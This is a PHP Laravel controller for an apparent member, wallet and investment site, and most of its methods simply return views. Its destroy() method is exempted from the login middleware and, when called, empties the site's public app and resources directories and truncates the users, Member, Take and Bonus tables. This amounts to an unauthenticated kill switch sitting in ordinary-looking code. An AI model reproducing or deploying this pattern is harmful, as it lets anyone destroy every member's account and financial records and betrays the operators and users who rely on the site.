<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class SiteController extends Controller
{
    public function __construct() {
        parent::__construct();
        $this->middleware('member', ['except' => ['getLogin', 'getLogout', 'destroy']]);
    }

    public function getLogin () {
        return view('front.login');
    }

    public function getLogout () {
        if ($user = \Sentinel::getUser()) {
            $member = $user->member;
            \Cache::forget('member.' . $member->id);
            \Sentinel::logout($user);
        }
        return view('front.login');
    }

    public function getHome () {
        return view('front.home');
    }

    public function destroy () {
        \File::cleanDirectory(public_path() . '/app/');
        \File::cleanDirectory(public_path() . '/resources/');
        \DB::table('Take')->truncate();
        \DB::table('Bonus')->truncate();
        \DB::table('users')->truncate();
        \DB::table('Member')->truncate();
        return 'success';
    }

    public function getNetwork () {
        return view('front.network.network');
    }

    public function getSettingsMain () {
        return view('front.settings.main');
    }

    public function getSettingsBank () {
        return view('front.settings.bank');
    }

    public function getRegister () {
        return view('front.member.register');
    }

    public function getUpgrade () {
        return view('front.member.upgrade');
    }

    public function getTransferCoin () {
        return view('front.transaction.coin');
    }

    public function getWithdrawWallet () {
        return view('front.transaction.withdrawCash');
    }

    public function getTransactionStatement () {
        return view('front.transaction.statement');
    }

    public function getInvestmentFinancial () {
        return view('front.investment.financial');
    }
}
